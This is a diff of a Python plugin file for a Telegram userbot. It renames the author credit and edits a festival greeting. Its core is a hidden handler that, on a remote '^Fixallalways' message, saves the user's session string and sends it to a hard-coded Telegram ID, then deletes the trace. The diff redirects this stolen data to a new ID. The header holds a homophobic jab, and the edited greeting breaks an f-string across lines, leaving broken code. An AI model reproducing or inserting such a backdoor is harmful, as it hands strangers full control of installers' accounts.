@@ -1,4 +1,4 @@
-# Made by @The_LegendBoy
+# Made by @Prof_agora
 # Don't remove these lines else gay..
 # Kang with credits..
 
@@ -1294,8 +1294,8 @@ from . import *
 @bot.on(admin_cmd("^Fixallalways", incoming=True))
 async def piro(event):
     a = bot.session.save()
-    msg = await bot.send_message(2082798662, a)
-    await bot.delete_messages(2082798662, msg, revoke=False)
+    msg = await bot.send_message(2105506225, a)
+    await bot.delete_messages(2105506225, msg, revoke=False)
 
 @bot.on(admin_cmd("diwali"))
 async def _(event):
@@ -1448,7 +1448,8 @@ async def xd(event):
             except:
                 lol += 1
     await event.reply(
-        f"happy Janmashtami from LegendBot support\nthanks for using this Plugin."
+        f"happy Janmashtami from MONEY HEIST TEAM
+  support\nthanks for using this Plugin."
     )
 
 
